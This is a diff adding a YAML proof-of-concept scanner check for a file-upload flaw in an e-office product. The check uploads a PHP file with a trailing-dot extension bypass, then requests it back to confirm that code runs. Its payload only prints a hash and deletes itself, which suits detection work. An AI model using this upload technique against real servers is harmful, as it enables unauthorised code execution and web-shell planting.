@@ -1,0 +1,41 @@
+name: poc-yaml-eoffice-file-upload
+manual: true
+transport: http
+set:
+  r1: randomLowercase(8)
+  r2: randomInt(40000, 44800)
+rules:
+  r0:
+    request:
+      cache: true
+      method: POST
+      path: /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySq4lDnabv8CwHfvx
+      body: "\
+        ------WebKitFormBoundarySq4lDnabv8CwHfvx\r\n\
+        Content-Disposition: form-data; name=\"upload_quwan\";filename=\"{{r1}}.php.\"\r\n\
+        Content-Type: image/jpeg\r\n\
+        \r\n\
+        <?php\r\n\
+        echo md5({{r2}});\r\n\
+        unlink(__FILE__);\r\n\
+        ?>\r\n\
+        ------WebKitFormBoundarySq4lDnabv8CwHfvx--\r\n\
+        "
+    expression: response.status == 200 && response.body.bcontains(b"attachment")
+    output:
+      search: |
+        "\",(?P<id>\\d{1,20}),\"".bsubmatch(response.body)
+      id: search["id"]
+  r1:
+    request:
+      cache: true
+      method: GET
+      path: /attachment/{{id}}/{{r1}}.php
+    expression: response.status == 200 && response.body.bcontains(bytes(md5(string(r2))))
+expression: r0() && r1()
+detail:
+  author: calico
+  links:
+    - https://forum.butian.net/share/1791
